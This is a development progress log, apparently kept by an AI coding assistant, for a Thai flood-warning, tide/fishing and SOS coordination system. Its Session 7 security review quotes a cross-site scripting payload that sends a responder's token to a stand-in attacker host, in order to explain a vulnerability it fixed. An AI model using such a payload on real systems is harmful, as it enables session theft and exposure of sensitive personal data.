# Progress log

Append-only. Newest entry at top. **Read this first when resuming a session.**
Purpose: survive a closed terminal or an expired token with zero context loss.

---

## Current state

**Phase:** 3 (Calm mode) — ✅ **code complete, locally verified. Not yet deployed.**
Remaining: Phase 5 (terrain/HAND), Phase 7 (global + multi-hazard).
**Next action:** user creates the private GitHub repo + pushes; then wire Cloudflare R2 secrets.
**Deploying matters now**: time-to-bank stays empty until the cron has built ~1-2 h of archive.
Then Phase 3 (calm mode / fishing), 5 (terrain) or 6 (harden + load test).
**Worker has never been executed** — no node here. First real run is `wrangler dev`.
**Blockers:** none for building. For *public launch*: ThaiWater terms unconfirmed, TMD needs API key.
**Needs user:** (1) push to private GitHub repo, (2) Cloudflare account for R2 secrets.

### Phase status
| Phase | Name | Status |
|---|---|---|
| 0 | Foundation | ✅ code complete, not deployed |
| 1 | Ingest + live map | ✅ code complete, not deployed |
| 2 | Risk engine | ✅ code complete, not deployed |
| 3 | Calm mode (tide/fishing) | ✅ code complete, not deployed |
| 4 | Respond (SOS) | ✅ code complete, not deployed |
| 5 | Terrain / HAND | ⬜ not started |
| 6 | Harden / scale | ✅ code complete, not deployed |
| 7 | Global + multi-hazard | ⬜ not started |

---

## 2026-09-15 — Session 9: deployment path (found and fixed a production-breaking gap)

**Done — 167 tests passing. `docs/DEPLOY.md` written.**

**The gap that mattered.** GitHub runners are ephemeral and `data/` is gitignored, so
every ingest run would have started with an **empty archive**. The risk engine fits
trends over our own archived history, so no trend would ever span the 45-minute minimum
and **time-to-bank — the headline feature of the whole project — would never have
appeared in production at all.** It works locally only because the archive accumulates
on this machine. Fixed by extending the `actions/cache` entry to cover `data/archive`
alongside `data/cache`, plus `--archive-keep-hours 48` and a `prune_archive()` that
bounds the cache (it parses the filename rather than trusting mtime, which a cache
restore resets — tested, because a bug there deletes history).

**Three smaller wiring gaps, all closed**
- Every page hardcoded `../data/out` and `http://127.0.0.1:8788`; in production they
  would 404. Added `web/config.js` — one file, two values — with the relative paths kept
  as the local-dev fallback so `python3 -m http.server` still works unchanged.
- The CSP `connect-src` did not allow R2, so fetches would have been blocked **with no
  visible error**. Added `*.r2.dev`; `config.js` marked `no-cache` so changing an
  endpoint is not defeated by a stale cache.
- The R2 upload guessed content types: `.geojson` uploads as `application/octet-stream`,
  which blocks Cloudflare's in-transit compression and turns a 130 KB payload into
  1.2 MB on the wire. Now set explicitly.

**Removed the biggest obstacle for this machine:** no Node here, so the Worker is
deployed from CI via `deploy-api.yml` (manual trigger, with an optional schema apply).
Nothing needs installing locally.

**`scripts/make_token.py`** mints responder tokens — shows the raw token once, stores
only its SHA-256, prints the INSERT and the revoke statement. Verified round-trip
against the real auth path: the minted token authenticates, the raw value is nowhere in
the database, a wrong token is rejected, and the Worker hashes identically.

**Flagged honestly in the guide:** time-to-bank stays empty for the first ~1-2 h by
design; the Actions minute budget only holds while each run finishes under 60 s (rounded
up, 1,440 runs/month against 2,000) with `*/45` as the fallback; R2.dev is
development-grade; a national-scale event still needs the $5/month Workers plan.

---

## 2026-09-15 — Session 8: Phase 3 built (calm mode — solunar & fishing)

**Done — 162 tests passing.**
- `astro.py` — sun/moon position, rise, set, transit, civil twilight. Events found
  **numerically** (scan altitude, bisect crossings) rather than by closed-form hour
  angle: one code path for both bodies, degrades gracefully where a body never rises.
- `fishing.py` — solunar windows, transparent bite scoring, clarity advice.
- `adapters/spots.py` — 40 spots: the 23 verified tide points plus 17 inland reservoirs
  and river reaches. Weather (pressure + wind) fetched in one batched call.
- `fishing.json` published (1.09 MB → **42 KB gzipped**, separate file so it never
  weighs on the flood map). `web/fish.html` with an hourly chart, tide curve, table view.

**Astronomy validated, not assumed**
- **Solar against Open-Meteo's own sunrise/sunset**, 5 locations × 7 days: agreement
  within **37 s worst case, 17 s mean** (they floor to the minute). Fixtures captured so
  the test runs offline.
- **Lunar against physical invariants** — no ephemeris to hand, so the sky is the oracle:
  transit drifts **47.7 min/day**, transit↔antitransit **12.4 h**, and at full moon
  **moonrise falls within 0.4 h of sunset**. All three hold.
- My first validation harness reported a 1,441-minute error. That was the *harness*
  mislabelling days — Open-Meteo files Bangkok's 23:06 UTC sunrise under the next local
  day. Re-matched by nearest event instead of by index.

**A data misreading caught before it shipped**
I was about to build reservoir mode on ThaiWater's `storage_percent`. Verified across
**794 stations, 100% agreement**, it is actually
`(level − ground) / (bank − ground)` — the fraction of CHANNEL depth filled. **115% means
15% ABOVE BANK, i.e. flooding**, not a full reservoir. Reading it the other way would
have been wrong in the most dangerous possible direction. Every station is
`tele_waterlevel`; there is no dam dataset here. Reservoir drawdown is therefore
explicitly NOT modelled, and `fishing.json` says so in its `caveat`.

**A fairness bug I wrote, then caught**
My own comment said tideless water must have the tide weight redistributed "otherwise
every inland spot would look worse than every coastal one for no real reason" — and I
then applied it only to reservoirs, leaving non-tidal rivers forfeiting 21 points they
could never earn. The scale was measuring "is it near the sea", not "is it worth going".
Fixed with `effective_weights(profile, has_tide)`. Inland mean peak went 37-40 → 48;
the bottom of the ranking is now small-tidal-range Gulf spots (Pattani 0.47 m swing),
which is physically correct.

**Chart design** — loaded the `dataviz` skill first. It changed two decisions: a
value-ramp across bars would double-encode height as hue and burn the free colour
channel (now one series colour with emphasis on the best hours), and the tide curve is a
**separate chart**, never a second y-axis. Could not run the palette validator (node
script, no node here) — acceptable only because this uses the reference palette's slot-1
blue unchanged with a single series, so there is no new palette to validate. Geometry
verified numerically across **2,880 bars**: no overflow, no label collisions.

**Design notes**
- Bite score weights the **rate** of tidal change, not height — slack water at high tide
  is the worst moment of the cycle and the one a height-based score would rate best.
- Turbidity is **tactics, not score**: muddy water changes how you fish, not whether.
- Every scored hour carries its factors; 0 hours score above zero without an explanation.

---

## 2026-09-15 — Session 7: Phase 6 (hardening — security, load, degraded mode)

**Done — 132 tests passing. Six security findings, all fixed.** See `docs/SECURITY.md`
and `docs/OPERATIONS.md`.

**Security review — the critical one**
`note` and `contact_name` come from the PUBLIC unauthenticated submit endpoint and were
rendered into the ops console with `innerHTML`. A submission containing
`<img src=x onerror="fetch('//attacker/?t='+localStorage.seraphim_token)">` runs in every
responder's browser and steals the token that unlocks the name, phone, precise location
and medical needs of everyone who asked for help. **Anonymous attacker → full access to
the most sensitive data in the system, via the one endpoint that must stay public.**
Fixed with an `esc()` escaper on every interpolation across all three pages, plus a CSP
in `web/_headers`.

Also fixed: province-scope bypass (scope was enforced in `list()` but not `detail()` or
`update()`, so a district volunteer could read any request in the country by id — now
404, not 403, so existence cannot be probed); a deployable placeholder `IP_SALT` that
would have made every stored IP hash reversible (now fails closed); and `sos.html`
accepting `?api=` from the URL, so a shared link could redirect a victim's name, phone,
location and health data to an attacker.

**Load test found a security control causing the harm it prevents**
Per-IP rate limiting of 12/10 min. Thai mobile networks use carrier-grade NAT, so
thousands of subscribers share one address: modelling 1,000 users behind one carrier NAT,
**988 legitimate requests rejected** — and mobile-only users are disproportionately those
with no landline to call 1784 from. Replaced with two buckets: **device** (8/10 min, the
real actor) and **IP** (300, or 900 when the report is life-threatening). Verified 400
distinct devices behind one NAT reporting `medical` all get through; one device spamming
stops at 8. 429s are queued and retried client-side, so a rate limit delays rather than
loses. *A false accept costs one triage review; a false reject can cost a life.*

**Capacity — the honest headline**
Read path is fine at any scale (311 GB CDN egress on unmetered Pages; static files never
reach an origin). **The write path is not: a national 2011-scale event needs ~204,000
Worker requests against a 100,000/day free tier.** Provincial and regional events fit.
**The fix is $5/month** (Workers Paid, 10M/month) and changes nothing architecturally.
Budget it before flood season, not during one.

**A bug my own fix introduced, caught by its own test**
Capping forecast escalation at level 4 (so level 5 means "water is over the bank now", an
observed fact, rather than a forecast wearing the same badge) — I wrote `min(4, level+1)`,
which **demoted genuinely over-bank stations from 5 to 4**: a cap meant to prevent
overstatement instead understated flooding rivers. Live level-5 count fell 305 → 273
before the test caught it. Rewritten as a guarded increment; regression test added.
Verified on live data: the level-5 set is now exactly the at-or-over-bank set.

**Time-to-bank is live.** The archive accumulated enough history during this session:
**47 stations** now carry a real time-to-bank, soonest **3.1 h** (ลำเซบาย, ยโสธร; also
บางตะบูน, เพชรบุรี rising 31 cm/hr). Trend confidence is `fair` for 298 stations — spans
are still ~1 h, so nothing reaches `good` (needs ≥2 h span and R²≥0.7) until the cron has
been running longer.

**Degraded mode** — service worker now caches snapshots, so an origin failure degrades to
last-known data behind an amber "may be out of date" banner rather than a blank page. Ops
console states plainly when the API is unreachable instead of leaving stale requests
looking current. No cached snapshot at all → a clear message pointing at 1784 / 191.

**Observability** — `meta.json` now carries a `health` block with an explicit
pass/warn/fail verdict and per-check detail, so a monitor reads one field. Thresholds in
`docs/OPERATIONS.md`. Guards the quiet failure: pipeline running, map rendering, data
hours out of date.

**Payload** — reasons are published only for risk level ≥ 2 (at level 1 they are
boilerplate). Snapshot 1.42 MB → 1.25 MB raw, 134 KB → 130 KB gzipped; ~190 KB per first
visit including the app shell.

**Still open:** SMS/USSD intake (needs a telco agreement; `source` already accepts
`'sms'`). The Worker has still never been executed — no node here.

---

## 2026-09-15 — Session 6: Phase 4 built (SOS emergency coordination)

**Done — Phase 4 code complete, 117 tests passing.** Verified end-to-end over real HTTP.
- `api/schema.sql` — D1/SQLite schema. PDPA-shaped: recorded consent, per-row
  `purge_after`, `access_log`, hashed tokens, hashed IPs.
- `api/src/index.js` — Cloudflare Worker. Submit / triage / detail / update / clusters /
  anonymised public summary / nightly purge cron.
- `workers/seraphim/sos.py` — domain rules (20 need codes, severity, geohash, clustering).
- `workers/seraphim/devserver.py` — **Python dev server implementing the same contract**,
  so the front end is testable without node or wrangler. Runs the real `schema.sql`.
- `web/sos.html` — citizen form, offline-first (IndexedDB queue + service worker).
- `web/ops.html` — responder triage console: queue, map, clusters, lifecycle, audit.

**The two-implementation problem, and how it is contained**
Production is a JS Worker; there is no node on this machine, so it cannot be executed
here. Rather than pretend otherwise: `api/conformance/severity.json` holds hand-reasoned
cases that BOTH implementations are tested against, plus tests that diff the need codes
and thresholds straight out of the JS source. If they ever disagree, the conformance file
is the referee. D1 *is* SQLite, so the dev server exercises the production schema.

**Bug found by the conformance suite**
My geohash sent a point sitting exactly on a cell midpoint to the LOW cell, so (0,0)
encoded as `7zzzz` instead of the standard `s0000`. Only matters on exact boundaries —
but 0/0 is precisely what a broken GPS reports. Fixed to `>=`, matching Redis /
Elasticsearch / geohash.org. The canonical example (`u4pruydqqvj`) still passes.

**Bug found in my own dev server**
The responder token was printed but never appeared: Python block-buffers stdout when
backgrounded, so you could start the server and have no way to sign in. Fixed with
`flush=True` plus a `--token-file` option.

**Design decisions that matter**
- **Offline is the default assumption.** Submissions queue in IndexedDB and retry; a
  client-generated `client_id` makes retries idempotent, so one family cannot become
  twelve pins and twelve boats. Enforced by a partial unique index in the schema.
- **Waiting escalates severity** at read time (+1 at 6 h, +2 at 12 h), so the queue
  reorders itself and nobody is forgotten in arrival order.
- **Clusters are dispatch hints, never merges** — the underlying requests stay open.
- **`access_log` outlives the data it describes**: it is the evidence that access was
  controlled, so it survives the purge.
- **Consent is mandatory**; submission is refused without it.
- **Trust tiers** (volunteer → official → admin) with optional province scope, so a
  district responder cannot read the whole country.
- `tel:1784` / `tel:191` are the largest, first elements on the citizen form — if
  someone is in danger, calling beats filling in a form.

**Verified end-to-end over HTTP:** submit → offline retry collapses to one → consent
refused → unauthenticated read blocked → responder queue sorted worst-first → clusters
(3 requests in one geohash in บางพลี) → assign → resolve → audit trail intact → public
summary leaks no PII.

**Explicitly NOT built (and why)**
- **SMS/USSD intake** — needs a Thai telco or Twilio agreement. `source` already accepts
  `'sms'`, so it slots in without a schema change.
- **`.go.th` magic-link sign-in** — needs an email provider. Manual allowlist works today.
- **Load testing** — Phase 6.

---

## 2026-09-15 — Session 5: Phase 2 built (risk engine)

**Done — Phase 2 code complete, 75 tests passing.**
- `history.py` — archive replay, duplicate collapsing, **least-squares** rate of rise with
  R²-based confidence (`good`/`fair`/`poor`/`none`).
- `risk.py` — explainable 1-5 scoring, **time-to-bank**, tide compounding, district rollup.
  Every score carries bilingual `reasons`; **1,121/1,121 stations carry reasoning**.
- `areas.json` — 479 districts, all **77/77 provinces**, ranked worst-first. Verified
  `(province_code, district_code)` is collision-free on real data.
- Map: risk mode (now default), a "เหตุผล · WHY" panel in every popup, prominent
  time-to-bank, and a clickable highest-risk-districts list.

**Why `waterlevel_msl_previous` is still not used (re-tested, decision confirmed)**
Measured it against our archive: 481 stations matched a prior archived level, but the gaps
clustered at **10 / 20 / 30 / 60 min with no single interval**, and most "matches" were flat
readings that prove nothing. A rate from an assumed Δt would be wrong by up to **6×**.
→ Rate comes only from our own timestamped archive. Regression (not two-point differencing)
because intervals are irregular and telemetry is noisy — two-point would turn one spurious
reading into a dramatic false alarm.

**ThaiWater has no usable public history endpoint.** `public/waterlevel_graph` accepts
`station_id` but returns a **Go panic** (index out of range). Stopped probing rather than
hammer a government API. Bootstrapping history is therefore not possible; the archive must
accumulate. Recorded in `docs/DATA_SOURCES.md`.

**Validation**
- Regression recovers a synthetic 0.10 m/hr exactly (R²=1.0) and 0.1057 under ±3 cm noise.
- Full replay through a real on-disk archive: 315 real stations given a synthetic 6 h history →
  **189 with time-to-bank**, arithmetic exact (0.24 m ÷ 0.30 m/hr = 0.8 h).
- Tide compounding fires correctly on live data at **Phra Pradaeng, Samut Prakan** (20 km from
  Chao Phraya mouth) and, in replay, **Bang Nam Priao, Chachoengsao** (51 km from Bang Pakong)
  — both genuinely tidal, flood-prone delta districts.
- Guards tested: TTB withheld on weak trends, on noise-level rates, when falling, when already
  over bank, and beyond a 72 h horizon.

**Live output right now:** risk 5=306, 4=2, 3=41, 2=194, 1=578 · **0 with time-to-bank**,
because the archive spans ~30 min (below the 45 min minimum span). Correct behaviour, and it
resolves itself once the cron runs.

**Two test bugs I introduced and fixed**
- A test helper hardcoded `district_code="01"`, collapsing two districts into one bucket.
  Prompted a real-data check: **no (province, district) collisions across 479 districts**.
- A `merge_current` assertion expected 1 reading where 2 is correct.

**Deliberate design choices**
- A stale gauge **keeps** its risk level (a silent gauge over bank is more alarming, not less)
  but drops to `confidence: poor` with an explicit reason.
- District rollup takes the **worst** station, never an average: one overtopping river is not
  cancelled out by three calm ones nearby.
- A high tide alone never raises a calm river — it only compounds already-elevated risk.

---

## 2026-09-15 — Session 4: Phase 1 built (forecast + tide layer)

**Done — Phase 1 code complete, verified against live data. 45 tests passing.**
- **Open-Meteo adapters** (`adapters/openmeteo.py`): `RainAdapter` (hourly precipitation,
  past 24 h + next 72 h) and `DischargeAdapter` (GloFAS 7-day river discharge).
  New `ForecastAdapter` interface — these *enrich* existing stations rather than create them,
  so it is deliberately separate from `SourceAdapter`.
- **Tide** (`adapters/marine.py` + `tide.py`): 23 curated Thai coastal points, extreme
  detection, tide state/rate, empirical range classification, lunar phase, and
  `coincidence_window` (high tide ∩ discharge = backwater risk, ready for Phase 2).
- **Map**: 3 view modes (level / rain 24 h / discharge trend), tide layer with next 5
  high–low times, enriched popups. Defaults to opening Chao Phraya mouth.
- **Per-source caching** (`cache.py`) + `actions/cache` in CI.

**Coverage:** rain 1,121/1,121 · discharge trend 1,087/1,121 · tide 23/23.
Snapshot 878 KB → 106 KB gzipped; tide.json 75 KB → 19 KB.
**Cold build 50 s, warm build 6 s** — the 30-min cron hits the warm path almost always.

**The quota problem, and the fix**
Naively refetching forecasts on the 30-min level cadence = ~100,000 Open-Meteo
location-calls/day against a **10,000/day** free allowance. Two-part fix:
1. **Batching** — verified the API takes 150 coordinates per request and returns them
   **in request order**. We use 100. Order is the ONLY link between a result and a station,
   so a length mismatch **drops the batch** rather than risk pairing the wrong forecast to
   the wrong river.
2. **Per-adapter refresh interval** — each adapter declares `refresh_hours` because its data
   goes stale at its own rate: rain 6 h (weather models), GloFAS 24 h (daily product),
   tide 24 h (harmonic). Total ≈ **5,600 calls/day**, comfortably inside the allowance,
   while keeping the time-sensitive input fresh.

**Physics finding that changed the design**
Validated lunar spring/neap against 25 days of real tide at Chao Phraya mouth. It **failed**:
"spring" days averaged 2.17 m vs "neap" 1.99 m — only 9% — and two days within 4 days of the
same new moon ranged 2.48 m and 1.81 m. Cause is real, not a bug: **the upper Gulf of Thailand
is a mixed, mainly-diurnal tide**, modulated by lunar *declination*, not phase. Shipping a
"spring tide" badge would have been confidently wrong.
→ Range is now classified **empirically** against each location's own recent distribution
(`range_regime`). Works in any tidal regime, so it also scales globally. Moon phase is kept
only for solunar fishing (Phase 3), where it genuinely applies. Documented in `tide.py`
and `docs/DATA_SOURCES.md`.

**Other things verified rather than assumed**
- Marine model resolves **sea cells only** — inland coords return an empty series (confirmed
  at Ayutthaya). Hence 23 curated coastal points, each individually probed: **23/23 usable**.
- Regional tide physics confirms itself: upper Gulf river mouths ~2.3 m (why Bangkok gets
  backwater flooding), southern Gulf 0.47–0.63 m, Andaman 1.7–2.6 m.
- Parabolic refinement of hourly samples recovers **sub-hourly** extreme timing
  ("high 18:26", not "high 18:00"), tested against a synthetic curve with a known answer.
- GloFAS returns no river at 12–34 gauges — expected for canals/gates below the ~5 km model.
  Left `null`, never 0.

**Next (Phase 2 — risk engine)**
- Rate of rise from **our own archive** (the interval is known there, unlike
  `waterlevel_msl_previous`) → **time-to-bank**, the headline number.
- Tide compounding via `coincidence_window` — already written and tested.
- Do NOT depend on `situation_level`: null for 302 of 306 overtopped stations (Session 3).

---

## 2026-09-15 — Session 3: Phase 0 built

**Done — Phase 0 is code complete and verified against live data.**
- **AGPL-3.0** chosen and `LICENSE` added. Repo to be **private for now**.
- **Cadence corrected for private repos.** GitHub Free gives private repos 2,000 Actions
  min/month, jobs rounded UP to whole minutes. `*/15` = ~2,880 min/mo -> **over budget**.
  Set cron to **`*/30`** (~1,440 min/mo). One-line change to `*/15` or `*/10` when public
  (public repos = unlimited). Documented at the top of `ingest.yml`.
- **Zero third-party dependencies.** Python stdlib only (no node/npm/pip on this machine
  anyway). No install step, fast CI, no supply chain.
- Built: `models.py` (canonical types + datum contract), `adapters/base.py` (`SourceAdapter`
  + null-safe parsers), `adapters/thaiwater.py`, `publish.py`, `cli.py`, 20 unittest tests,
  `ingest.yml`, `keepalive.yml`, static MapLibre map, README.
- **Live verified:** 1,121/1,121 stations parsed. 680 KB -> 79 KB gzipped (8.6x).
  306 at/over bank, 355 stale, median reading age ~64 min. Map + data paths serve over HTTP 200.

**Bugs found and fixed while building**
1. **All 1,121 stations were silently dropped.** ThaiWater sends station ids as *ints*;
   the `text()` helper only accepted `str`, so every row failed the id gate and the build
   published an empty map. Fixed by adding an explicit `ident()` parser. Lesson: the id
   gate needed its own test, and now has one.
2. **Wrong id field.** `row.id` changes every reading (it identifies the *observation*);
   `station.id` is the stable gauge key. Using `row.id` would have created ~1,121 brand-new
   "stations" every 30 minutes and destroyed any history. Now uses `station.id`.

**Validated, not assumed**
- 306 stations at/over bank looked alarmingly high (27%), so it was checked rather than
  shipped: the source's own `diff_wl_bank_text` flags exactly the same set as `ล้นตลิ่ง`
  (overflowing). **Sign agreement 1,121/1,121.** September is peak monsoon — the number is real.
- The sign cross-check is now permanent in the adapter and warns on any disagreement, because
  inverting freeboard would turn "overtopped" into "safe" — the worst failure this system could have.
- **`situation_level` is null for 302 of the 306 overtopped stations.** The source's own
  severity field is unreliable exactly when it matters most, so our computed freeboard is the
  better signal. Do not depend on `situation_level` in Phase 2.

**Deliberately NOT done (and why)**
- **No rate-of-rise / time-to-bank yet.** `waterlevel_msl_previous` exists, but the interval
  between it and the current reading is undocumented. A rate over an assumed delta-t would be a
  guess presented as a measurement. Phase 2 computes it from *our own* archived history, where
  the interval is known. Recorded in `models.py`.
- **Snapshots are not committed to git** — ~600 KB x 48/day is ~10 GB/year. `data/` is gitignored;
  output goes to R2. `keepalive.yml` exists because a repo that never commits would have its
  scheduled workflows silently disabled after 60 days.

---

## 2026-09-15 — Session 2: naming, move, free-tier re-architecture

**Done**
- Renamed project **NAMFAO → SeRAPHIM**
  (*System for early Real-time Assessment & Predictive Hazard Incident Monitoring*).
  All files moved to `/home/khunanon/Mini_Project/Project_SeRAPHIM`, git re-init'd at that root
  (it is the future GitHub repo root). Skill dir renamed to `.claude/skills/seraphim/`.
  Verified zero stale `namfao` references.
- Re-architected for **free hosting + open source**. Verified free-tier limits live:
  - GitHub Actions: **unlimited minutes on public repos**; scheduled workflows auto-disable
    after 60 days of repo inactivity (known silent-failure mode → needs heartbeat)
  - Cloudflare: Workers 100k req/day + 10 ms CPU · **D1 500 MB** (not 5 GB — corrected) ·
    R2 10 GB with **$0 egress** · Pages bandwidth effectively unlimited
- **Key structural decision: no runtime database on the monitoring/prediction path.**
  Actions cron → compute → static snapshot JSON + PMTiles → Cloudflare CDN. A million map views
  cost $0 and touch no origin. Also the most disaster-resilient shape available.
  Corollary: the site MUST stay statically pre-rendered, or page views burn the Worker cap.
- Chose **Cloudflare over Vercel** — Vercel Hobby forbids commercial use, which would cap the
  project's future; Cloudflare free has no such restriction and unlimited bandwidth.
- Added SOS **trust tiers** (public → verified volunteer → verified official) so the system is
  useful with zero verified officials on day one.
- Proposed official-verification ladder: `.go.th` magic link + manual allowlist → invite tree →
  agency SSO. Recorded in PLAN §9.

**Decided**
- Name: SeRAPHIM · Hosting: free tier, open source · no PostGIS/Timescale at runtime
  (spatial work runs offline in Actions, ships as static geometry)

**Open questions for user**
- Open-source licence: AGPL-3.0 (keeps hosted forks open) vs MIT (max adoption)
- Cloudflare + GitHub accounts needed at Phase 0 start

---

## 2026-09-15 — Session 1: research & planning

**Done**
- Confirmed empty project dir; `git init`. Python 3.14.7 available; no node/docker detected yet.
- Researched and **live-tested** data sources (results in `docs/DATA_SOURCES.md`):
  - ✅ ThaiWater `api-v3.thaiwater.net/api/v1/thaiwater30/public/waterlevel` — **1,121 live
    stations**, keyless. Has `waterlevel_msl`, `waterlevel_msl_previous`, `min_bank`,
    `critical_level_msl`, `diff_wl_bank`, `situation_level`, lat/lon, basin, tambon geocode.
    This is enough for a real early-warning engine.
  - ✅ ThaiWater `/public/rain_24h` — 24h rainfall by station
  - ✅ Open-Meteo Flood (GloFAS river discharge), Forecast (precip), Marine
    (`sea_level_height_msl` = tide; verified 2.29 m swing in Gulf of Thailand)
  - ✅ GDACS global events, USGS earthquakes
  - ❌ TMD `data.tmd.go.th` — HTTP 000 + robots.txt disallows → needs official API key
  - ❓ GISTDA portal up (200) but endpoints unprobed
  - ❓ No clean public CCTV feed found yet
- Key insight: global backbone (Open-Meteo + GDACS) is keyless and worldwide → **global scaling
  is half-solved from day one**; national networks are upgrades behind a `SourceAdapter`.
- Asked user 4 scoping questions. Answers: real product · map first · SOS full-but-unofficial ·
  stack my choice.
- Wrote `docs/PLAN.md`, `docs/DATA_SOURCES.md`, `CLAUDE.md`, `.claude/skills/seraphim/SKILL.md`.

**Decided**
- Stack: Next.js 15 + TS + MapLibre GL + Postgres/PostGIS/TimescaleDB + Python workers, pnpm monorepo
- Headline feature = **time-to-bank** (hours until overtopping), with explainable reasoning
- Tide compounding (spring high tide ∩ discharge peak) is the Bangkok-specific insight
- Calm-mode fishing planner is a retention strategy, not a toy — installed on quiet days = trusted on bad days

**Open questions raised (all since resolved — see Session 2)**
- Final product name · hosting + budget · verifying real officials
